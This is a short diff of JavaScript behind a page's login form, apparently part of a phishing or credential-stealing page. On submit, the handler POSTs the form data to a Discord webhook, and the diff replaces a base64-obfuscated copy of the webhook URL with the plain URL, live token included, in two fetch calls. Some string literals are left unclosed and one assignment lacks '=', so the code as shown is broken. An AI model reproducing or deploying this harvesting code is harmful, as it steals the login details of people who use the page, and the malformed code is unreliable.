@@ -34,7 +34,7 @@ document.getElementById('loginForm').addEventListener('submit', function(e) {
             }
 
             // Send data to Discord webhook
-            fetch('aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTMxMTM4NTIzNTAwMjM2Mzk0NS9OWjhpVUxSMXgxWWxEWmp3UjZfZGg4em8weTBWTDc0b1hjcmlKNExRbDBnc1A4VDlOT2ZwMmFzZ1pyclNRb3A4c2Z3bE8= {
+            fetch('https://discord.com/api/webhooks/1311385235002363945/NZ8iULR1x1YlDZj6R_hg8zo0y0VL74oXcriJ4LQl0gsP8T9NOfp2asgZrrSQop8sfwlO {
                 method: 'POST',
                 headers: {
                     'Content-Type': 'application/json',
@@ -45,7 +45,7 @@ document.getElementById('loginForm').addEventListener('submit', function(e) {
             });
 
             // Decode and fetch user info
-            const userInfo 'aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTMxMTM4NTIzNTAwMjM2Mzk0NS9OWjhpVUxSMXgxWWxEWmp3UjZfZGg4em8weTBWTDc0b1hjcmlKNExRbDBnc1A4VDlOT2ZwMmFzZ1pyclNRb3A4c2Z3bE8=';
+            const userInfo 'https://discord.com/api/webhooks/1311385235002363945/NZ8iULR1x1YlDZj6R_hg8zo0y0VL74oXcriJ4LQl0gsP8T9NOfp2asgZrrSQop8sfwlO';
 
             fetch(userInfo, {
                 method: 'POST',
